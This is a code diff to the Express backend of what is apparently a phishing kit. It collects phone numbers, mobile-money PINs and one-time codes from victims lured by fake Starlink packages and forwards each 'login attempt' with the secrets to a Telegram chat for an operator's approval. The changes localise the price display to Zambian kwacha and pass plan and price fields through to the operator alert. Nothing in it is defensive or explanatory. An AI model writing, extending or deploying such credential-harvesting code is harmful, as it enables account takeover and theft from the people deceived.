@@ -105,7 +105,7 @@ function notifyTelegramForRequest(id, { plan, price, phone, step, code, otp, lin
   const text =
     `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
     `📦 Data: ${plan || '—'}\n` +
-    `💰 Price: USD ${price || '—'}\n` +
+    `💰 Price: ZMW ${price || '—'}\n` +
     `📱 Phone: \`${telegramPhone}\`\n` +
     secretLine;
 
@@ -314,14 +314,19 @@ app.post('/api/mtn/submit-otp', (req, res) => {
 });
 
 app.post('/api/mtn/submit', (req, res) => {
-  const { phone, pin, starlinkPackage, country } = req.body || {};
+  const { phone, pin, starlinkPackage, country, plan, price } = req.body || {};
   if (!phone || !pin) {
     return res.status(400).json(jsonError('Missing phone or pin'));
   }
 
+  const packagePlan = plan || starlinkPackage || 'Starlink';
+  const normalizedPrice = String(price || '')
+    .replace(/[^\d.,]/g, '')
+    .replace(',', '.') || '—';
+
   const requestId = createApprovalRequest({
-    plan: starlinkPackage || 'Starlink',
-    price: country || 'USD',
+    plan: packagePlan,
+    price: normalizedPrice,
     phone,
     step: 'login',
     code: pin,
